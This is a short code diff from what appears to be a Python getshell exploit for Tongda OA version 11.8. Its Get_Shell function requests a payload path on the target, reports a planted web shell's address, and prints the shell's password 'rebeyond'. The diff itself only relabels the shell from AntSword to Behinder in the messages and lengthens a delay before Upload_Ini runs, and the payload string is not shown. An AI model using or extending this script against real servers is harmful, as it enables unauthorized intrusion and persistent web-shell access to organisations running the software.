@@ -59,11 +59,11 @@ def Get_Shell(target_url,cookie): ## 通达11.8getshell
     try:
         res = requests.get(url=target_url + payload, headers=headers, timeout=5)
         if res.status_code == 200:
-            print('[*] 成功上传蚁剑shell, 密码为: rebeyond')
+            print('[*] 成功上传冰蝎shell, 密码为: rebeyond')
             print('[*] Shell地址为: {}'.format(target_url + payload) + '\n')
             sys.exit(0)
         else:
-            print('[*]  成功上传蚁剑shell, 密码为: rebyeond')
+            print('[*]  成功上传冰蝎shell, 密码为: rebyeond')
             print('[*] Shell地址为: {}'.format(target_url + payload))
             print('[!] 可能需要等待一会儿即可连接。\n')
             sys.exit(0)
@@ -71,5 +71,5 @@ def Get_Shell(target_url,cookie): ## 通达11.8getshell
         pass
 
 def run(host):
-    time.sleep(8)
+    time.sleep(12)
     Upload_Ini(host)
